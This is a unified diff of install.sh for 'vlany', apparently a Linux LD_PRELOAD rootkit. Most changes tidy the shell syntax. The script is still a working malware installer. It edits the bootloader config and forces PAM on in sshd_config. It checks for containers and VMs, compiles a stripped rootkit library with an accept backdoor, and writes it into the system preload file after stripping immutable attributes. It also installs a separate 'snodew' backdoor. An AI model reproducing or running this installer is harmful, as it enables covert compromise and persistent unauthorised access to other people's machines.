@@ -33,11 +33,11 @@ read -p "Enter location of bootloader config file (if grub2, config file is /boo
 [ ! -z $REPLY ] && GRUB_CONF="$REPLY"
 [ ! -f "$GRUB_CONF" ] && echo "File $GRUB_CONF doesn't exist. You might have to manually find and edit the config file. (read this part of install.sh)"
 [ -f "$GRUB_CONF" ] && sed -i -- "s/\bro\b/rw/g" $GRUB_CONF # ok thats better, change read-only to read/write. ruins some recovery stuff, but an ok fix for now...
-[[ "$GRUB_CONF" == *"/etc/grub.d/"* ]] && update-grub
+[[ "$GRUB_CONF" == *"/etc/grub.d/"* ]] && { echo "Updating grub"; update-grub; }
 echo "Done."
 
 [ ! -e /proc ] && { echo "We're in a terrible jail. /proc doesn't exist. Exiting."; exit; }
-if [ ! -f `which gcc 2>/dev/null || echo "NO"` ]; then
+if [ -z "`which gcc`" ]; then
     echo "Installing gcc"
 
     if [ -f /usr/bin/yum ]; then
@@ -60,16 +60,15 @@ read -p "Press enter to continue, or ^C to exit."
 
 # conditional warnings, credits to a certain individual
 gcc misc/detect_lxc.c -o misc/detect_lxc
-[[ $(misc/detect_lxc) == *"definitely in LXC"* ]] && { read -p "Warning: In an LXC container. Press enter to continue or ^C to exit."; }
-rm misc/detect_lxc
+[[ $(misc/detect_lxc && rm misc/detect_lxc) == *"definitely in LXC"* ]] && { read -p "Warning: In an LXC container. Press enter to continue or ^C to exit."; }
 [[ $(misc/detect_openvz.sh) == *"in OpenVZ"* ]] && { read -p "Warning: In an OpenVZ container. Press enter to continue or ^C to exit."; }
-[ -f `which sash 2>/dev/null || echo "NO"` ] && { read -p "Warning: sash is installed on this box. Press enter to continue or ^C to exit."; }
+[ ! -z "`which sash`" ] && { read -p "Warning: sash is installed on this box. Press enter to continue or ^C to exit."; }
 [ -d /proc/vz ] && { read -p "Warning: You're attempting to install vlany in an OpenVZ environment. Press enter to continue or ^C to exit."; }
 [ -f /usr/bin/lveps ] && { read -p "Warning: You're attempting to install vlany in a CloudLinux LVE. Press enter to continue or ^C to exit."; }
-[[ $(cat /proc/scsi/scsi 2>/dev/null | grep "VBOX") == *"VBOX"* ]] && { read -p "Warning: You're attempting to install vlany on a VirtualBox VM. Press enter to continue or ^C to exit."; }
+[[ $(cat /proc/scsi/scsi 2>/dev/null | grep "VBOX") == *"VBOX"* ]] && { read -p "Warning: You're attempting to install vlany on a VirtualBox VM. Press enter to continue or ^C to exit."; } # afaik this only works on ubuntu
 
 # nothing fatal but still good to know
-[ -d /proc/xen ] && { echo "Information: You're attempting to install vlany in a Xen environment. Don't worry about this too much."; }
+[ -d /proc/xen ] && { echo "Information: You're installing vlany on a Xen environment."; }
 [ ! -f /etc/ssh/sshd_config ] && { echo "/etc/ssh/sshd_config not found. ssh might not be installed. Install it."; exit; }
 [ ! "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] && { echo "UsePAM yes" >> /etc/ssh/sshd_config; }
 
@@ -141,14 +140,11 @@ install_vlany_prerequisites ()
         pacman -S --noconfirm python2 &>/dev/null
     fi
 
-    PYTHON_BIN=`which python2`
-    [ ! -f "$PYTHON_BIN" ] && { echo "$PYTHON_BIN was not found. Make sure python2 is installed."; exit; }
+    [ -z "`which python2`" ] && { echo "python2 was not found. Exiting."; exit; }
 }
 
 vlany_install_dialog ()
 {
-    DIALOG_BIN="/usr/bin/dialog"
-
     echo "Installing dialog"
     if [ -f /usr/bin/yum ]; then
         yum install -y -q -e 0 dialog
@@ -160,7 +156,7 @@ vlany_install_dialog ()
         pacman -S --noconfirm dialog &>/dev/null
     fi
 
-    [ ! -f "$DIALOG_BIN" ] && { echo "$DIALOG_BIN was not found. Either install dialog and run this script again, or run this script with the --cli flag."; exit; }
+    [ -z "`which dialog`" ] && { echo "dialog was not found. Either install dialog and run this script again, or run this script with the --cli flag."; exit; }
 }
 
 get_vlany_settings ()
@@ -261,9 +257,7 @@ config_vlany ()
         else
             echo "Configuration failed. Exiting."
         fi
-        sleep 3
-        clear
-        exit
+        sleep 3; clear; exit
     fi
 }
 
@@ -275,10 +269,10 @@ compile_vlany ()
     LINKER_OPTIONS="-Wl,--build-id=none"
 
     # no point in linking libssl if SSL isn't being used for the accept backdoor lol
-    [ $SSL_STATUS == 1 ] && { LINKER_FLAGS="-ldl -lssl -lcrypt"; }
-    [ $SSL_STATUS == 0 ] && { LINKER_FLAGS="-ldl -lcrypt"; }
+    [ $SSL_STATUS == 1 ] && LINKER_FLAGS="-ldl -lssl -lcrypt"
+    [ $SSL_STATUS == 0 ] && LINKER_FLAGS="-ldl -lcrypt"
 
-    rm -rf *.so.*
+    rm -rf *.so.* # remove any already compiled libs
     gcc -std=gnu99 $OPTIMIZATION_FLAGS vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.x86_64
     gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS vlany.c $WARNING_FLAGS $OPTIONS -shared $LINKER_FLAGS $LINKER_OPTIONS -o ${OBJECT_FILE_NAME}.so.i686 &>/dev/null
     strip ${OBJECT_FILE_NAME}.so.x86_64 || { echo "Couldn't strip library. Compilation failed, exiting."; exit; }
@@ -289,16 +283,15 @@ install_vlany ()
 {
     rm -rf $INSTALL/
     mkdir -p $INSTALL/
-    [ "`uname -m`" == "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.x86_64 $INSTALL/${OBJECT_FILE_NAME}.v6l; }
-    [ "`uname -m`" != "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.* $INSTALL/; }
-    [ -f "$NEW_PRELOAD" ] && { chattr -ia $NEW_PRELOAD &>/dev/null; }
+    [ "`uname -m`" == "armv6l" ] && cp ${OBJECT_FILE_NAME}.so.x86_64 $INSTALL/${OBJECT_FILE_NAME}.v6l
+    [ "`uname -m`" != "armv6l" ] && cp ${OBJECT_FILE_NAME}.so.* $INSTALL/
+    [ -f "$NEW_PRELOAD" ] && chattr -ia $NEW_PRELOAD &>/dev/null
     echo -n $LIB_LOCATION > $NEW_PRELOAD
 }
 
 setup_vlany ()
 {
-    # remove compilation stuff
-    export ${ENV_VAR}=1
+    export ${ENV_VAR}=1 # temporary rk user permission so we can get stuff ready
     rm -rf *.so.* *.o
 
     echo "Date/time of vlany installation: $(date "+%a, %d %b %Y - %T")" >> $INSTALL/.vlany_information
@@ -457,8 +450,6 @@ else
     install_snodew
 fi
 
-clear
-cat $INSTALL/.vlany_information
-echo "Installation finished."
+clear; cat $INSTALL/.vlany_information; echo "Installation finished."
 [ "$REPLY" == "YES" ] && echo "Look in the directory you specified for the filename of the snodew backdoor.";
 exit
